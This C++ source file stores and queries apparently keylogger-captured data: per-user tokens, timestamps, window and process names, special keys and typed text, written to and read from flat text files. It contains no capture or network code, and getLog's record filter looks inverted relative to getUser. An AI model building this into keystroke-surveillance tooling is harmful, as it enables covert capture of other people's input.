//
// Created by wurtz on 10/6/17.
//

#include <fstream>
#include "File.hpp"

File::File(const std::string &path)
: _path(path), _check(0)
{
}

File::~File()
{
}

void                File::setCheck(int check)
{
    if (_check != -1
        && (check == _check || check == 0 || (check - _check) == 1))
    {
       _check = check;
    }
    else
    {
        _check = -1;
    }
}

void                File::checkDelimiter(std::map<std::string, std::string> &tmpData,
                                         std::string &line,
                                         const std::string &filter,
                                         Log::delimiterName deliName,
                                         int check)
{
    if (line.find(Log::delimiterString[Log::flagDeliName] + Log::delimiterString[deliName] + ":" + Log::delimiterString[Log::flagDeliName] + " ") == 0
             && (filter.empty()
                 || (!filter.empty() && line.find(filter) < std::string::npos)))
    {
        boost::replace_all(line, Log::delimiterString[Log::flagDeliName] + Log::delimiterString[deliName] + ":" + Log::delimiterString[Log::flagDeliName] + " ", "");
        tmpData[Log::delimiterString[deliName]] = line;
        setCheck(check);
    }
}

void                File::postUser(const std::string &token)
{
    std::vector<std::map<std::string, std::string>> data;
    std::ofstream   file(_path + "user.txt", std::ios::app);

    if (file.is_open())
    {
        data = getUser(token);
        if (data.empty())
        {
            file << Log::delimiterString[Log::flagDeliName] << Log::delimiterString[Log::tokenDeliName] << ":" << Log::delimiterString[Log::flagDeliName] << " " << token << "\n";
            file << Log::delimiterString[Log::flagDeliName] << Log::delimiterString[Log::accountNameDeliName] << ":" << Log::delimiterString[Log::flagDeliName] << " " << "NULL" << "\n";
            file << Log::delimiterString[Log::flagDeliName] << Log::delimiterString[Log::endDeliName] << Log::delimiterString[Log::flagDeliName] << "\n";
        }
    }
    file.close();
}

void                File::postLog(const std::string &token,
                          Log &log)
{
    std::vector<std::map<std::string, std::string>> data;
    std::ofstream   file(_path + "log.txt", std::ios::app);

    if (file.is_open())
    {
        data = log.getData();
        for (auto &it : data)
        {
            file << Log::delimiterString[Log::flagDeliName] << Log::delimiterString[Log::tokenDeliName] << ":" << Log::delimiterString[Log::flagDeliName] << " " << token << "\n";
            file << Log::delimiterString[Log::flagDeliName] << Log::delimiterString[Log::dateTimeDeliName] << ":" << Log::delimiterString[Log::flagDeliName] << " " << it["dateTime"] << "\n";
            file << Log::delimiterString[Log::flagDeliName] << Log::delimiterString[Log::windowNameDeliName] << ":" << Log::delimiterString[Log::flagDeliName] << " " << it["windowName"] << "\n";
            file << Log::delimiterString[Log::flagDeliName] << Log::delimiterString[Log::processNameDeliName] << ":" << Log::delimiterString[Log::flagDeliName] << " " << it["processName"] << "\n";
            file << Log::delimiterString[Log::flagDeliName] << Log::delimiterString[Log::inputSpecialDeliName] << ":" << Log::delimiterString[Log::flagDeliName] << " " << it["inputSpecial"] << "\n";
            file << Log::delimiterString[Log::flagDeliName] << Log::delimiterString[Log::inputTextDeliName] << ":" << Log::delimiterString[Log::flagDeliName] << " " << it["inputText"] << "\n";
            file << Log::delimiterString[Log::flagDeliName] << Log::delimiterString[Log::endDeliName] << Log::delimiterString[Log::flagDeliName] << "\n";
        }
        file.close();
    }
}

std::vector<std::map<std::string, std::string>>    File::getUser(const std::string &token,
                                                                 const std::string &accountName,
                                                                 const int &row)
{
    std::vector<std::map<std::string, std::string>> data;
    std::map<std::string, std::string>              tmpData;
    std::ifstream   file(_path + "user.txt");
    std::string     line;

    (void)row;
    _check = 0;
    if (file.is_open())
    {
        while (getline(file, line))
        {
            if (line.find(Log::delimiterString[Log::flagDeliName] + Log::delimiterString[Log::endDeliName] + Log::delimiterString[Log::flagDeliName]) == 0)
            {
                if (_check != -1)
                {
                    data.push_back(tmpData);
                }
                tmpData.clear();
                _check = 0;
            }
            checkDelimiter(tmpData, line, token, Log::tokenDeliName, 1);
            checkDelimiter(tmpData, line, accountName, Log::accountNameDeliName, 2);
        }
    }
    return (data);
};

std::vector<std::map<std::string, std::string>>    File::getLog(const std::string &token,
                                                                const std::string &inputText,
                                                                const std::string &inputSpecial,
                                                                const std::string &dateTime,
                                                                const std::string &windowName,
                                                                const std::string &processName,
                                                                const int &row)
{
    std::vector<std::map<std::string, std::string>> data;
    std::map<std::string, std::string>              tmpData;
    std::ifstream   file(_path + "log.txt");
    std::string     line;

  (void)row;
    _check = 0;
    if (file.is_open())
    {
        while (getline(file, line))
        {
            if (line.find(Log::delimiterString[Log::flagDeliName] + Log::delimiterString[Log::endDeliName] + Log::delimiterString[Log::flagDeliName]) == 0)
            {
                if (_check == -1)
                {
                    data.push_back(tmpData);
                }
                tmpData.clear();
                _check = 0;
            }
            checkDelimiter(tmpData, line, token, Log::tokenDeliName, 1);
            checkDelimiter(tmpData, line, dateTime, Log::dateTimeDeliName, 2);
            checkDelimiter(tmpData, line, windowName, Log::windowNameDeliName, 3);
            checkDelimiter(tmpData, line, processName, Log::processNameDeliName, 4);
            checkDelimiter(tmpData, line, inputSpecial, Log::inputSpecialDeliName, 5);
            checkDelimiter(tmpData, line, inputText, Log::inputTextDeliName, 6);
        }
        file.close();
    }
    return (data);
}